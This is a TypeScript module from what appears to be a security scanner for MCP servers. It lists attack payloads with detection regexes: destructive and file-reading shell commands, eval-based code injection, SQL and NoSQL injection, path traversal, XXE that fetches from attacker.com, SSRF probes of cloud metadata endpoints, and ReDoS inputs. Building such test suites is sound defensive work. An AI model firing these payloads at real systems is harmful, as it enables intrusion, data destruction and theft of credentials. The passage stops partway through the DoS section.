/**
 * Backend API Security Patterns
 * Tests MCP server API security with 20 focused patterns
 *
 * Architecture: Attack-Type with Specific Payloads
 * - Critical Injection (6 patterns): Command, Calculator, SQL, Path Traversal, XXE, NoSQL
 * - Input Validation (3 patterns): Type Safety, Boundary Testing, Required Fields
 * - Protocol Compliance (2 patterns): MCP Error Format, Timeout Handling
 * - Tool-Specific Vulnerabilities (7 patterns): Indirect Injection, Unicode Bypass, Nested Injection, Package Squatting, Data Exfiltration, Configuration Drift, Tool Shadowing
 * - Resource Exhaustion (1 pattern): DoS/Resource Exhaustion
 * - Deserialization (1 pattern): Insecure Deserialization
 *
 * Scope: Backend API Security ONLY
 * - Tests structured data inputs to API endpoints
 * - Validates server-side security controls
 * - Tests MCP protocol compliance
 * - Tests tool-specific vulnerability patterns with parameter-aware payloads
 *
 * Out of Scope: LLM Prompt Injection
 * - MCP servers are APIs that receive structured data, not prompts
 * - If a server uses an LLM internally, that's the LLM's responsibility
 * - We test the MCP API layer, not the LLM behavior layer
 */

import { SecurityRiskLevel } from "./assessmentTypes";

export interface SecurityPayload {
  payload: string;
  evidence: RegExp; // Pattern indicating actual execution (not safe reflection)
  riskLevel: SecurityRiskLevel;
  description: string;
  payloadType: string; // e.g., "injection", "validation", "protocol"
  parameterTypes?: string[]; // Optional: target specific parameter names (e.g., ["url", "uri"] for URL payloads)
}

export interface AttackPattern {
  attackName: string;
  description: string;
  payloads: SecurityPayload[]; // Specific payload variations
}

/**
 * ========================================
 * BACKEND API SECURITY PATTERNS
 * ========================================
 *
 * 20 focused patterns for MCP server API security
 */
export const SECURITY_ATTACK_PATTERNS: AttackPattern[] = [
  // ==========================================
  // CRITICAL INJECTION TESTS (4)
  // ==========================================

  // 1. COMMAND INJECTION
  {
    attackName: "Command Injection",
    description:
      "Test if tool executes system commands instead of treating them as safe parameters",
    payloads: [
      // System command payloads - might trigger command execution tools
      {
        payload: "whoami",
        evidence: /\b(root|user|admin)\b/i,
        riskLevel: "HIGH",
        description: "System identity command",
        payloadType: "injection",
      },
      {
        payload: "ls -la",
        evidence: /(total|drwx|rwx|-rw-|permissions|directory)/i,
        riskLevel: "HIGH",
        description: "Directory listing command",
        payloadType: "injection",
      },
      {
        payload: "pwd",
        evidence: /\/[a-z]+/i,
        riskLevel: "HIGH",
        description: "Working directory command",
        payloadType: "injection",
      },
      {
        payload: "; rm -rf /",
        evidence: /(deleted|removed|rm.*rf)/i,
        riskLevel: "HIGH",
        description: "Command chaining with destructive command",
        payloadType: "injection",
      },
      {
        payload: "| cat /etc/passwd",
        evidence: /(root:x:|file.*protocol.*executed|local.*file.*ran)/i,
        riskLevel: "HIGH",
        description: "Pipe to file access command",
        payloadType: "injection",
      },
    ],
  },

  // 2. SQL INJECTION
  {
    attackName: "SQL Injection",
    description: "Test if tool properly escapes SQL commands",
    payloads: [
      {
        payload: "'; DROP TABLE users;--",
        evidence: /(dropped|deleted|table.*users|sql.*error|syntax.*error)/i,
        riskLevel: "HIGH",
        description: "SQL command injection",
        payloadType: "injection",
      },
      {
        payload: "' OR '1'='1",
        evidence: /(sql|query|select|where.*1.*1|syntax.*error)/i,
        riskLevel: "HIGH",
        description: "Boolean-based SQL injection",
        payloadType: "injection",
      },
      {
        payload: "admin'--",
        evidence: /(sql.*executed|admin.*query|syntax.*error)/i,
        riskLevel: "HIGH",
        description: "Comment-based SQL injection",
        payloadType: "injection",
      },
      {
        payload: "' UNION SELECT * FROM passwords--",
        evidence: /(union.*select|password|sql.*error|syntax.*error)/i,
        riskLevel: "HIGH",
        description: "UNION-based SQL injection",
        payloadType: "injection",
      },
    ],
  },

  // 3. CALCULATOR INJECTION
  {
    attackName: "Calculator Injection",
    description:
      "Test if calculator/math tools execute arbitrary expressions instead of safely storing them",
    payloads: [
      // Simple arithmetic - triggers eval() in vulnerable calculator tools
      {
        payload: "2+2",
        evidence: /The answer is 4/i,
        riskLevel: "HIGH",
        description: "Simple arithmetic expression (common trigger)",
        payloadType: "injection",
      },
      {
        payload: "5*5",
        evidence: /The answer is 25/i,
        riskLevel: "HIGH",
        description: "Multiplication expression",
        payloadType: "injection",
      },
      {
        payload: "100+200",
        evidence: /The answer is 300/i,
        riskLevel: "HIGH",
        description: "Addition with larger numbers",
        payloadType: "injection",
      },
      // Natural language triggers
      {
        payload: "what is 10*10",
        evidence: /The answer is 100/i,
        riskLevel: "HIGH",
        description: "Natural language math query",
        payloadType: "injection",
      },
      {
        payload: "calculate 50+50",
        evidence: /The answer is 100/i,
        riskLevel: "HIGH",
        description: "Calculate command",
        payloadType: "injection",
      },
      // Code injection via eval()
      {
        payload: "__import__('os').system('whoami')",
        evidence: /\b(root|user|admin|ubuntu)\b/i,
        riskLevel: "HIGH",
        description: "Python code injection via eval",
        payloadType: "injection",
      },
      {
        payload: "1+1; __import__('subprocess').run(['whoami'])",
        evidence: /\b(root|user|admin|ubuntu)\b/i,
        riskLevel: "HIGH",
        description: "eval chain to system command",
        payloadType: "injection",
      },
    ],
  },

  // 4. PATH TRAVERSAL
  {
    attackName: "Path Traversal",
    description:
      "Test if tool allows access to files outside intended directory",
    payloads: [
      {
        payload: "../../../etc/passwd",
        evidence: /(root:x:0:0|file.*accessed|passwd.*file)/i,
        riskLevel: "HIGH",
        description: "Unix path traversal",
        payloadType: "injection",
      },
      {
        payload: "..\\..\\..\\windows\\system32\\config\\sam",
        evidence: /(\[boot loader\]|sam.*file|system32)/i,
        riskLevel: "HIGH",
        description: "Windows path traversal",
        payloadType: "injection",
      },
      {
        payload: "/etc/passwd",
        evidence: /(root:x:0:0|file.*accessed)/i,
        riskLevel: "HIGH",
        description: "Absolute path access",
        payloadType: "injection",
      },
      {
        payload: "file:///etc/passwd",
        evidence: /(root:x:|file.*protocol.*executed|local.*file.*accessed)/i,
        riskLevel: "HIGH",
        description: "File protocol exploitation",
        payloadType: "injection",
      },
    ],
  },

  // 5. XXE INJECTION (XML External Entity)
  {
    attackName: "XXE Injection",
    description:
      "Test if tool processes XML external entities, allowing file disclosure or SSRF",
    payloads: [
      // Classic XXE - file disclosure
      {
        payload:
          '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        evidence:
          /(root:x:0:0|xxe.*processed|external.*entity.*loaded|file.*contents)/i,
        riskLevel: "HIGH",
        description: "XXE file disclosure via SYSTEM entity",
        payloadType: "injection",
        parameterTypes: ["xml", "data", "body", "payload", "content"],
      },
      // XXE with Windows path
      {
        payload:
          '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        evidence:
          /(\[fonts\]|\[extensions\]|xxe.*processed|windows.*file.*accessed)/i,
        riskLevel: "HIGH",
        description: "XXE Windows file disclosure",
        payloadType: "injection",
        parameterTypes: ["xml", "data", "body", "payload"],
      },
      // XXE SSRF via HTTP entity
      {
        payload:
          '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
        evidence:
          /(ami-id|instance-id|xxe.*fetched|metadata.*accessed|ssrf.*xml)/i,
        riskLevel: "HIGH",
        description: "XXE SSRF to AWS metadata",
        payloadType: "injection",
        parameterTypes: ["xml", "data", "body", "payload"],
      },
      // Parameter entity XXE (blind XXE)
      {
        payload:
          '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo>test</foo>',
        evidence:
          /(dtd.*loaded|parameter.*entity|external.*dtd|xxe.*processed)/i,
        riskLevel: "HIGH",
        description: "Blind XXE via parameter entity",
        payloadType: "injection",
        parameterTypes: ["xml", "data", "body", "payload"],
      },
      // XXE in SOAP request
      {
        payload:
          '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>',
        evidence: /(root:x:0:0|soap.*xxe|xxe.*soap|external.*entity)/i,
        riskLevel: "HIGH",
        description: "XXE in SOAP envelope",
        payloadType: "injection",
        parameterTypes: ["xml", "soap", "body", "request"],
      },
    ],
  },

  // 6. NOSQL INJECTION
  {
    attackName: "NoSQL Injection",
    description:
      "Test if tool is vulnerable to NoSQL injection attacks (MongoDB, Redis, etc.)",
    payloads: [
      // MongoDB operator injection
      {
        payload: '{"$gt": ""}',
        evidence:
          /(all.*documents|query.*executed|mongodb.*error|operator.*injection|nosql.*executed)/i,
        riskLevel: "HIGH",
        description: "MongoDB $gt operator injection",
        payloadType: "injection",
        parameterTypes: ["query", "filter", "where", "search", "data"],
      },
      // MongoDB $ne always-true
      {
        payload: '{"$ne": null}',
        evidence:
          /(returned.*all|bypass.*auth|nosql.*injection|query.*result|documents.*found)/i,
        riskLevel: "HIGH",
        description: "MongoDB $ne bypass injection",
        payloadType: "injection",
        parameterTypes: ["query", "filter", "where", "password", "username"],
      },
      // MongoDB $where JavaScript injection
      {
        payload: '{"$where": "this.password.match(/.*/)"}',
        evidence:
          /(javascript.*executed|\$where.*processed|nosql.*js|all.*passwords|query.*executed)/i,
        riskLevel: "HIGH",
        description: "MongoDB $where JavaScript injection",
        payloadType: "injection",
        parameterTypes: ["query", "filter", "where", "data"],
      },
      // MongoDB $regex DOS
      {
        payload: '{"$regex": "^(a+)+$"}',
        evidence:
          /(regex.*executed|redos|timeout|catastrophic.*backtracking|query.*slow)/i,
        riskLevel: "MEDIUM",
        description: "MongoDB ReDoS via $regex",
        payloadType: "injection",
        parameterTypes: ["query", "filter", "search", "pattern"],
      },
      // MongoDB union-style query
      {
        payload: "admin', $or: [ {}, { 'a': 'a",
        evidence:
          /(admin.*returned|auth.*bypass|or.*injection|nosql.*executed)/i,
        riskLevel: "HIGH",
        description: "MongoDB $or injection bypass",
        payloadType: "injection",
        parameterTypes: ["username", "user", "name", "query"],
      },
      // Redis command injection
      {
        payload: "test\r\nCONFIG GET *\r\n",
        evidence:
          /(redis.*config|requirepass|maxmemory|save.*seconds|redis.*command.*executed)/i,
        riskLevel: "HIGH",
        description: "Redis CRLF command injection",
        payloadType: "injection",
        parameterTypes: ["key", "value", "data", "input"],
      },
      // Redis Lua script injection
      {
        payload: "EVAL \"return redis.call('INFO')\" 0",
        evidence:
          /(redis_version|used_memory|connected_clients|lua.*executed)/i,
        riskLevel: "HIGH",
        description: "Redis Lua script injection",
        payloadType: "injection",
        parameterTypes: ["script", "command", "query", "data"],
      },
      // CouchDB injection
      {
        payload: '{"selector": {"$or": [{"_id": {"$gt": null}}]}}',
        evidence:
          /(all.*documents|couchdb.*query|selector.*executed|documents.*returned)/i,
        riskLevel: "HIGH",
        description: "CouchDB selector injection",
        payloadType: "injection",
        parameterTypes: ["query", "selector", "filter", "find"],
      },
    ],
  },

  // ==========================================
  // INPUT VALIDATION TESTS (3)
  // ==========================================

  // 7. TYPE SAFETY
  {
    attackName: "Type Safety",
    description: "Test if tool validates parameter types correctly",
    payloads: [
      {
        payload: "not_a_number",
        evidence:
          /(type.*error|invalid.*type|expected.*number|cannot.*convert)/i,
        riskLevel: "MEDIUM",
        description: "String instead of number",
        payloadType: "validation",
      },
      {
        payload: "999999999999999",
        evidence:
          /(overflow|out.*of.*range|exceeds.*maximum|number.*too.*large)/i,
        riskLevel: "MEDIUM",
        description: "Numeric overflow",
        payloadType: "validation",
      },
      {
        payload: "true",
        evidence:
          /(type.*error|invalid.*type|expected.*string|cannot.*convert)/i,
        riskLevel: "LOW",
        description: "Boolean instead of string",
        payloadType: "validation",
      },
    ],
  },

  // 8. BOUNDARY TESTING
  {
    attackName: "Boundary Testing",
    description: "Test edge cases and boundary conditions",
    payloads: [
      {
        payload: "",
        evidence:
          /(empty.*not.*allowed|required|cannot.*be.*empty|must.*not.*be.*empty)/i,
        riskLevel: "LOW",
        description: "Empty string validation",
        payloadType: "validation",
      },
      {
        payload: "A".repeat(10000),
        evidence: /(too.*long|exceeds.*length|maximum.*length|length.*limit)/i,
        riskLevel: "MEDIUM",
        description: "Maximum length validation",
        payloadType: "validation",
      },
      {
        payload: "-1",
        evidence: /(negative.*not.*allowed|must.*be.*positive|invalid.*value)/i,
        riskLevel: "LOW",
        description: "Negative number validation",
        payloadType: "validation",
      },
    ],
  },

  // 9. REQUIRED FIELDS
  {
    attackName: "Required Fields",
    description: "Test if tool validates required parameters",
    payloads: [
      {
        payload: "MISSING_REQUIRED",
        evidence:
          /(required|missing.*parameter|field.*required|parameter.*required)/i,
        riskLevel: "MEDIUM",
        description: "Missing required fields",
        payloadType: "validation",
      },
    ],
  },

  // ==========================================
  // PROTOCOL COMPLIANCE TESTS (2)
  // ==========================================

  // 10. MCP ERROR FORMAT
  {
    attackName: "MCP Error Format",
    description: "Verify errors follow MCP protocol specification",
    payloads: [
      {
        payload: "INVALID_TRIGGER_ERROR",
        evidence: /(isError|error|invalid|failed)/i,
        riskLevel: "LOW",
        description: "Error response compliance check",
        payloadType: "protocol",
      },
    ],
  },

  // 11. TIMEOUT HANDLING
  {
    attackName: "Timeout Handling",
    description: "Test if tool handles long operations gracefully",
    payloads: [
      {
        payload: "SIMULATE_LONG_OPERATION",
        evidence: /(timeout|timed.*out|exceeded.*time|operation.*timeout)/i,
        riskLevel: "LOW",
        description: "Operation timeout handling",
        payloadType: "protocol",
      },
    ],
  },

  // ==========================================
  // TOOL-SPECIFIC VULNERABILITY TESTS (7)
  // ==========================================

  // 12. INDIRECT PROMPT INJECTION (HTTP URL Fetching + SSRF)
  {
    attackName: "Indirect Prompt Injection",
    description:
      "Test if tool fetches external content or allows SSRF attacks against internal services",
    payloads: [
      {
        payload: "http://example.com",
        evidence:
          /(status_code.*200|status.*200.*content|<html|<!DOCTYPE|fetched.*http.*content)/i,
        riskLevel: "HIGH",
        description: "Benign URL fetch test",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint", "address"],
      },
      {
        payload: "http://evil.com/inject.txt",
        evidence: /(fetched|retrieved|evil\.com|malicious|injected)/i,
        riskLevel: "HIGH",
        description: "Malicious URL fetch test",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link"],
      },
      // SSRF - Local/Internal Services
      {
        payload: "http://localhost",
        evidence:
          /(SSRF.*fetched|SSRF.*attempted|fetched.*internal|127\.0\.0\.1|localhost.*request|connection.*refused|ECONNREFUSED)/i,
        riskLevel: "HIGH",
        description: "SSRF - localhost access attempt",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint", "address"],
      },
      {
        payload: "http://127.0.0.1:6379",
        evidence:
          /(SSRF.*fetched|SSRF.*attempted|redis|PONG|\+OK|127\.0\.0\.1.*request|fetched.*internal)/i,
        riskLevel: "HIGH",
        description: "SSRF - Redis service access",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint"],
      },
      {
        payload: "http://127.0.0.1:3306",
        evidence:
          /(SSRF.*fetched|SSRF.*attempted|mysql|mariadb|3306.*request|fetched.*internal)/i,
        riskLevel: "HIGH",
        description: "SSRF - MySQL service access",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint"],
      },
      // SSRF - Cloud Metadata Endpoints
      {
        payload: "http://169.254.169.254/latest/meta-data/",
        evidence:
          /(SSRF.*fetched|SSRF.*attempted|ami-id|instance-id|iam|security-credentials|metadata.*169\.254|fetched.*internal)/i,
        riskLevel: "HIGH",
        description: "SSRF - AWS metadata endpoint",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint"],
      },
      {
        // GCP metadata via IP (more reliable than metadata.google.internal which requires GCP DNS)
        payload: "http://169.254.169.254/computeMetadata/v1/project/project-id",
        evidence:
          /(SSRF.*attempted.*169\.254|SSRF.*fetched.*169\.254|HTTPConnectionPool.*169\.254|attempted.*SSRF.*metadata|google.*project|gcp.*metadata)/i,
        riskLevel: "HIGH",
        description: "SSRF - GCP metadata endpoint",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint"],
      },
      {
        payload: "http://169.254.169.254/metadata/instance",
        evidence:
          /(SSRF.*fetched|SSRF.*attempted|subscriptionId|resourceGroup|vmId|azure.*metadata|fetched.*internal)/i,
        riskLevel: "HIGH",
        description: "SSRF - Azure metadata endpoint",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint"],
      },
      // SSRF - Internal Network
      {
        payload: "http://192.168.1.1",
        evidence:
          /(SSRF.*fetched|SSRF.*attempted|192\.168.*request|fetched.*internal|router|gateway)/i,
        riskLevel: "HIGH",
        description: "SSRF - Internal network access",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint"],
      },
      {
        payload: "http://10.0.0.1",
        evidence:
          /(SSRF.*fetched|SSRF.*attempted|10\.0\.0.*request|fetched.*internal|private.*network)/i,
        riskLevel: "HIGH",
        description: "SSRF - Private network (10.x) access",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint"],
      },
      // SSRF - File Protocol
      {
        payload: "file:///etc/passwd",
        evidence:
          /(root:x:0:0|file.*protocol|local.*file|file.*accessed|SSRF.*file)/i,
        riskLevel: "HIGH",
        description: "SSRF - file:// protocol abuse",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint"],
      },
      // SSRF - DNS Rebinding Attacks
      // DNS rebinding bypasses IP-based checks by initially resolving to a safe IP,
      // then rebinding to internal IPs after security validation
      {
        payload: "http://rebind.network/dnsbin",
        evidence:
          /(dns.*rebind|rebind.*detected|internal.*access.*after|SSRF.*rebind|resolved.*internal)/i,
        riskLevel: "HIGH",
        description: "DNS rebinding - generic rebind domain",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint"],
      },
      {
        payload: "http://a]@127.0.0.1/",
        evidence:
          /(localhost|127\.0\.0\.1|internal.*access|SSRF.*bypass|host.*header.*injection)/i,
        riskLevel: "HIGH",
        description: "DNS rebinding - URL parser confusion",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint"],
      },
      {
        payload: "http://127.0.0.1.nip.io",
        evidence:
          /(localhost|127\.0\.0\.1|internal.*access|nip\.io.*resolved|SSRF.*bypass)/i,
        riskLevel: "HIGH",
        description: "DNS rebinding - nip.io wildcard DNS",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint"],
      },
      {
        payload: "http://169.254.169.254.nip.io/latest/meta-data/",
        evidence:
          /(metadata|ami-id|instance-id|SSRF.*metadata|nip\.io.*resolved)/i,
        riskLevel: "HIGH",
        description: "DNS rebinding - AWS metadata via nip.io",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint"],
      },
      {
        payload: "http://0x7f000001",
        evidence:
          /(localhost|127\.0\.0\.1|internal.*access|SSRF.*hex|hex.*ip.*resolved)/i,
        riskLevel: "HIGH",
        description: "DNS rebinding - hexadecimal IP encoding",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint"],
      },
      {
        payload: "http://2130706433",
        evidence:
          /(localhost|127\.0\.0\.1|internal.*access|SSRF.*decimal|decimal.*ip.*resolved)/i,
        riskLevel: "HIGH",
        description: "DNS rebinding - decimal IP encoding",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint"],
      },
      {
        payload: "http://[::ffff:127.0.0.1]",
        evidence:
          /(localhost|127\.0\.0\.1|internal.*access|ipv6.*mapped|SSRF.*ipv6)/i,
        riskLevel: "HIGH",
        description: "DNS rebinding - IPv6 mapped IPv4",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint"],
      },
      {
        payload: "http://spoofed.burpcollaborator.net",
        evidence:
          /(burp.*collaborator|external.*interaction|dns.*lookup.*detected|SSRF.*detected)/i,
        riskLevel: "HIGH",
        description: "DNS rebinding - out-of-band interaction test",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint"],
      },
    ],
  },

  // 13. UNICODE BYPASS
  {
    attackName: "Unicode Bypass",
    description: "Test if tool decodes and executes unicode-encoded commands",
    payloads: [
      {
        payload: "\\u0077\\u0068\\u006f\\u0061\\u006d\\u0069", // "whoami"
        evidence: /(root|user|admin|decoded.*executed|unicode.*executed)/i,
        riskLevel: "MEDIUM",
        description: "Unicode-encoded system command",
        payloadType: "injection",
        parameterTypes: ["text", "content", "message", "input", "data"],
      },
      {
        payload: "\\u0069\\u0067\\u006e\\u006f\\u0072\\u0065", // "ignore"
        evidence: /(decoded|unicode|ignore.*previous|executed)/i,
        riskLevel: "MEDIUM",
        description: "Unicode-encoded instruction",
        payloadType: "injection",
        parameterTypes: ["text", "content", "message"],
      },
    ],
  },

  // 14. NESTED INJECTION
  {
    attackName: "Nested Injection",
    description: "Test if tool executes hidden instructions in nested JSON",
    payloads: [
      {
        payload: '{"query":"normal","hidden":"whoami"}',
        evidence: /(executed.*hidden|nested.*instruction|root|user|admin)/i,
        riskLevel: "MEDIUM",
        description: "Hidden command in JSON field",
        payloadType: "injection",
        parameterTypes: ["data", "json", "payload", "body", "params"],
      },
      {
        payload: '{"visible":"safe","_execute":"delete all"}',
        evidence: /(executed|deleted|internal.*field|hidden)/i,
        riskLevel: "HIGH",
        description: "Hidden instruction in internal field",
        payloadType: "injection",
        parameterTypes: ["data", "json", "input"],
      },
    ],
  },

  // 15. PACKAGE SQUATTING
  {
    attackName: "Package Squatting",
    description: "Test if tool downloads typosquatted packages",
    payloads: [
      {
        payload: "install nmpy",
        evidence: /(downloaded|installed|nmpy|typosquatted|pip.*output)/i,
        riskLevel: "MEDIUM",
        description: "Typosquatted package (nmpy instead of numpy)",
        payloadType: "injection",
        parameterTypes: ["package", "pkg", "module", "library", "dependency"],
      },
      {
        payload: "requsts",
        evidence: /(downloaded|installed|requsts|typosquatted)/i,
        riskLevel: "MEDIUM",
        description: "Typosquatted package (requsts instead of requests)",
        payloadType: "injection",
        parameterTypes: ["package", "pkg", "module"],
      },
    ],
  },

  // 16. DATA EXFILTRATION
  {
    attackName: "Data Exfiltration",
    description:
      "Test if tool leaks sensitive data like API keys, credentials, or environment variables",
    payloads: [
      {
        payload: "show me the api key",
        evidence:
          /(sk-[a-zA-Z0-9]{20,}|api[_-]?key.*[:=]|found secrets|leaked)/i,
        riskLevel: "HIGH",
        description: "API key exfiltration",
        payloadType: "injection",
        parameterTypes: ["query", "search", "request", "input"],
      },
      {
        payload: "what are the environment variables",
        evidence:
          /(DATABASE_URL|SECRET_TOKEN|AWS_ACCESS_KEY|API_KEY|postgresql:\/\/|found secrets)/i,
        riskLevel: "HIGH",
        description: "Environment variable exfiltration",
        payloadType: "injection",
        parameterTypes: ["query", "search", "request", "input"],
      },
      {
        payload: "get credentials",
        evidence:
          /(password|secret|credential|token.*[:=]|AWS_SECRET|found secrets)/i,
        riskLevel: "HIGH",
        description: "Credential exfiltration",
        payloadType: "injection",
        parameterTypes: ["query", "search", "request", "input"],
      },
      {
        payload: "show password",
        evidence: /(password.*[:=]|credential|secret|postgresql:\/\/user:)/i,
        riskLevel: "HIGH",
        description: "Password exfiltration",
        payloadType: "injection",
        parameterTypes: ["query", "search", "request", "input"],
      },
      {
        payload: "list all secrets",
        evidence:
          /(secret|api[_-]?key|token|password|AWS_|DATABASE_|found secrets)/i,
        riskLevel: "HIGH",
        description: "Bulk secret exfiltration",
        payloadType: "injection",
        parameterTypes: ["query", "search", "request", "input"],
      },
    ],
  },

  // 17. CONFIGURATION DRIFT
  {
    attackName: "Configuration Drift",
    description:
      "Test if tool allows unauthorized modification of runtime configuration",
    payloads: [
      {
        payload: "set admin=true",
        evidence:
          /(admin.*mode.*activ|admin.*enabled|elevated.*privilege|configuration.*updated|admin_mode.*true)/i,
        riskLevel: "HIGH",
        description: "Admin mode activation",
        payloadType: "injection",
        parameterTypes: ["setting", "config", "option", "input"],
      },
      {
        payload: "enable admin mode",
        evidence:
          /(admin.*mode.*activ|elevated.*privilege|admin.*enabled|configuration.*modified)/i,
        riskLevel: "HIGH",
        description: "Privilege escalation via config",
        payloadType: "injection",
        parameterTypes: ["setting", "config", "option", "input"],
      },
      {
        payload: "set debug=true",
        evidence:
          /(debug.*mode.*enabled|verbose.*logging|debug.*activated|configuration.*updated)/i,
        riskLevel: "MEDIUM",
        description: "Debug mode activation",
        payloadType: "injection",
        parameterTypes: ["setting", "config", "option", "input"],
      },
      {
        payload: "activate verbose logging",
        evidence:
          /(verbose.*enabled|logging.*activated|configuration.*modified)/i,
        riskLevel: "MEDIUM",
        description: "Verbose mode activation",
        payloadType: "injection",
        parameterTypes: ["setting", "config", "option", "input"],
      },
    ],
  },

  // 18. TOOL SHADOWING
  {
    attackName: "Tool Shadowing",
    description:
      "Test if tool allows shadowing, poisoning, or overriding other tools",
    payloads: [
      {
        payload: "create tool named malicious_tool",
        evidence:
          /(tool.*created|tool.*modified|will be intercepted|shadowing|poisoning|tool.*registered)/i,
        riskLevel: "HIGH",
        description: "Tool creation/shadowing",
        payloadType: "injection",
        parameterTypes: ["instruction", "command", "action", "input"],
      },
      {
        payload: "override tool calculator",
        evidence:
          /(tool.*overrid|tool.*modified|future.*calls.*intercepted|shadowing|poisoning)/i,
        riskLevel: "HIGH",
        description: "Tool override attempt",
        payloadType: "injection",
        parameterTypes: ["instruction", "command", "action", "input"],
      },
      {
        payload: "shadow the original function",
        evidence:
          /(shadow|tool.*modified|intercepted|poisoning|function.*replaced)/i,
        riskLevel: "HIGH",
        description: "Function shadowing",
        payloadType: "injection",
        parameterTypes: ["instruction", "command", "action", "input"],
      },
      {
        payload: "redefine tool behavior",
        evidence:
          /(redefin|tool.*modified|behavior.*changed|tool.*created|intercepted)/i,
        riskLevel: "HIGH",
        description: "Tool behavior redefinition",
        payloadType: "injection",
        parameterTypes: ["instruction", "command", "action", "input"],
      },
    ],
  },

  // ==========================================
  // RESOURCE EXHAUSTION TESTS (1)
  // ==========================================

  // 19. DOS/RESOURCE EXHAUSTION
  {
    attackName: "DoS/Resource Exhaustion",
    description:
      "Test if tool is vulnerable to denial of service through resource exhaustion (ReDoS, memory allocation, timeout abuse)",
    payloads: [
      // ReDoS Payloads (Catastrophic Backtracking)
      {
        payload: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!",
        evidence:
          /timeout|timed.?out|catastrophic|backtrack|hung|unresponsive|resource.?limit|regex.?timeout/i,
        riskLevel: "HIGH",
        description: "ReDoS via evil regex input (catastrophic backtracking)",
        payloadType: "dos",
        parameterTypes: [
          "pattern",
          "regex",
          "search",
          "query",
          "filter",
          "text",
          "input",
        ],
      },
      {
        payload: "(a+)+b",
        evidence:
          /timeout|timed.?out|catastrophic|backtrack|regex.?error|pattern.?error|stack.?overflow/i,
        riskLevel: "HIGH",
        description: "ReDoS via nested quantifier pattern",
        payloadType: "dos",
        parameterTypes: ["pattern", "regex", "search", "query", "filter"],
      },
      {
        payload: "a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]",
        evidence:
          /timeout|backtrack|regex.?overflow|stack.?overflow|parse.?error/i,
        riskLevel: "HIGH",
        description: "ReDoS via character class abuse",
        payloadType: "dos",
        parameterTypes: ["pattern", "regex", "search", "query"],
      },
      {
        payload: "^(([a-z])+.)+[A-Z]([a-z])+$",
        evidence:
          /timeout|catastrophic|backtrack|polynomial|exponential|regex.?complexity/i,
        riskLevel: "HIGH",
        description: "ReDoS via polynomial complexity pattern",
        payloadType: "dos",
        parameterTypes: ["pattern", "regex", "search", "query", "filter"],
      },

      // Memory Allocation Payloads
      {
        payload: "999999999999",
        evidence:
          /memory.?error|allocation.?failed|out.?of.?memory|heap|buffer.?overflow|resource.?limit|integer.?overflow/i,
        riskLevel: "HIGH",
        description: "Memory exhaustion via large number input",
        payloadType: "dos",
        parameterTypes: [
          "size",
          "count",
          "length",
          "limit",
          "amount",
          "quantity",
          "number",
        ],
      },
      {
        // Pre-evaluated 10KB string
        payload: "x".repeat(10000),
        evidence:
          /too.?long|exceeds.?length|maximum.?length|length.?limit|resource.?limit|payload.?too.?large|memory/i,
        riskLevel: "MEDIUM",
        description: "Memory exhaustion via large string payload (10KB)",
        payloadType: "dos",
      },
      {
        // 10-level deep nested JSON
        payload:
          '{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{}}}}}}}}}}}',
        evidence:
          /stack.?overflow|recursion|depth.?limit|nesting.?limit|too.?deep|parse.?error|json.?depth/i,
        riskLevel: "HIGH",
        description: "Stack exhaustion via deep JSON nesting",
        payloadType: "dos",
        parameterTypes: ["data", "json", "body", "payload", "input"],
      },

      // Timeout Abuse Payloads
      {
        payload: "sleep(99999)",
        evidence:
          /timeout|timed.?out|operation.?cancelled|deadline|long.?running|sleep.?executed/i,
        riskLevel: "HIGH",
        description: "Timeout abuse via sleep command injection",
        payloadType: "dos",
        parameterTypes: ["command", "script", "code", "expression", "input"],
      },
      {
        payload: "WAITFOR DELAY '00:10:00'",
        evidence:
          /timeout|timed.?out|sql.?timeout|query.?timeout|waitfor.?executed/i,
        riskLevel: "HIGH",
        description: "Timeout abuse via SQL WAITFOR",
        payloadType: "dos",
        parameterTypes: ["query", "sql", "command"],
      },
      {
        // 20-level nested array
        payload: "[[[[[[[[[[[[[[[[[[[[]]]]]]]]]]]]]]]]]]]]",
        evidence:
          /stack.?overflow|recursion|depth|nesting|too.?deep|parse.?error/i,
        riskLevel: "MEDIUM",
        description: "Stack exhaustion via nested arrays",
        payloadType: "dos",
        parameterTypes: ["data", "array", "list", "items"],
      },

      // Expansion Attacks
      {
        // Zip bomb indicator (base64 header of compressed content)
